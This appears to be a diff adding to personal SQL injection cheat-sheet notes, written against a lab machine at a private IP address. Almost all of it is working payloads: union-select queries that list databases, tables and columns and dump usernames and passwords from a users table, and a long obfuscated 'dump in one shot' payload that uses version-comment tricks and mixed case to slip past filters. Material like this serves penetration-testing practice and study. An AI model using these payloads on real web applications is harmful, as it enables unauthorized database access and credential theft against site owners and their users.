@@ -47,6 +47,16 @@ http://10.10.211.148/post?id=-2 union select 1,2,3,4--+--[inserting -(null value
 10.10.211.148/post?id=2 and 1=2 union select 1,2,3,4--+--(id=2 is true ,1=2 is false , true and false is false, ==> that means revealling the false column within column 1,2,3,4)
 2,3 are false columns.
 
+Using union select properly
+---------------------------
+10.10.211.148/post?id=2' union select 1,schema_name,3,4 from information_schema.schemata-- -   [show databases]
+
+10.10.211.148/post?id=2' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- [show tables] 
+
+10.10.211.148/post?id=2' UNION select 1,COLUMN_NAME,3,4 FROM INFORMATION_SCHEMA.COLUMNS where table_name='users'-- - [show column name]
+
+10.10.211.148/post?id=2' UNION select 1,username,password FROM ilfreight.users [ilfreight is database and users is table]
+
 ***Can also use DH dios in exploit.html to extract data****
 -------------------------------------------------------------
 http://10.10.211.148/post?id=2 and 1=2 union select 1,/*!50000cOncat/**Darknet-Haxor**/*/(0x6d30306e,0x3c2f623e3c2f666f6e743e3c62723e3c62723e,0x3c666f6e7420636f6c6f723d22626c7565223e,0x56455253494f4e3a3a20,/*!50000VerSiOn/**Darknet-Haxor**/*/(),0x3c62723e,0x555345523a3a20,/*!50000UsEr/**Darknet-Haxor**/*/(),0x3c62723e,0x44415441424153453a3a20,/*!50000DaTabaSe/**Darknet-Haxor**/*/(),0x3c62723e,0x3c62723e,0x544f54414c2044415441424153453a3a20,0x3c62723e,(SeLECT(@w)/*!50000FrOM/**Darknet-Haxor**/*/(/*!50000SeLECT/**Darknet-Haxor**/*/(@w:=0x00)+,(SeLECT(@w)/*!50000FrOM/**Darknet-Haxor**/*/(/*!50000InFOrMATIoN_SChEmA/**Darknet-Haxor**/*/.SCheMaTA)/*!50000WhErE/**Darknet-Haxor**/*/(@w)IN(@w:=/*!50000CoNCaT/**Darknet-Haxor**/*/(0x20,@w,0x3c666f6e7420636f6c6f723d22726564223e2d2d2d2d2d2d3e203c2f666f6e743e,/*!50000sCheMa_NaMe/**Darknet-Haxor**/*/,0x3c62723e))))w),0x3c62723e,0x3c62723e,0x555345522050524956494c4547453a3a20,0x3c62723e,(SeLECT(@z)/*!50000FrOM/**Darknet-Haxor**/*/(/*!50000SeLECT/**Darknet-Haxor**/*/(@z:=0x00)+,(SeLECT(@z)/*!50000FrOM/**Darknet-Haxor**/*/(/*!50000INFOrmATiON_SChEmA/**Darknet-Haxor**/*/.UsER_PRIViLEgES)/*!50000WhERE/**Darknet-Haxor**/*/(@z)IN(@z:=/*!50000CoNCaT/**Darknet-Haxor**/*/(0x20,@z,0x3c666f6e7420636f6c6f723d22726564223e2d2d2d2d2d2d3e203c2f666f6e743e,GrANtEE,0x202d3e20,Is_gRANTaBLE,0x3c62723e))))z),0x3c2f666f6e743e,0x3c62723e,0x3c62723e,0x3c666f6e7420636f6c6f723d22696e6469676f223e3c2d2d2d204441524b4e4554202d204841584f52202d2d2d3e3c2f666f6e743e3c62723e,(selEct(@x)/*!50000fRom/**Darknet-Haxor**/*/(/*!50000sElect/**Darknet-Haxor**/*/(@x:=0x00),(sElect(0)/*!From/**Darknet-Haxor**/*/(/*!50000inforMation_schEma.coLuMns/**Darknet-Haxor**/*/)/*!50000Where/**Darknet-Haxor**/*/(taBle_schema=/*!50000DatAbase/**Darknet-Haxor*/*/())and(0x00)in(@x:=/*!50000coNcat/**Darknet-Haxor**/*/(@x,0x3c62723e,0x3c666f6e7420636f6c6f723d22726564223e2d2d3e203c2f666f6e743e,0x3c666f6e7420636f6c6f723d22677265656e223e,/*!50000tAble_naMe/**Darknet-Haxor**/*/,0x3c666f6e7420636f6c6f723d22726564223e203a3a203c666f6e7420636f6c6f723d22677265656e223e,/*!50000colUmn_naMe/**Darknet-Haxor**/*/))))x)),3,4--+--
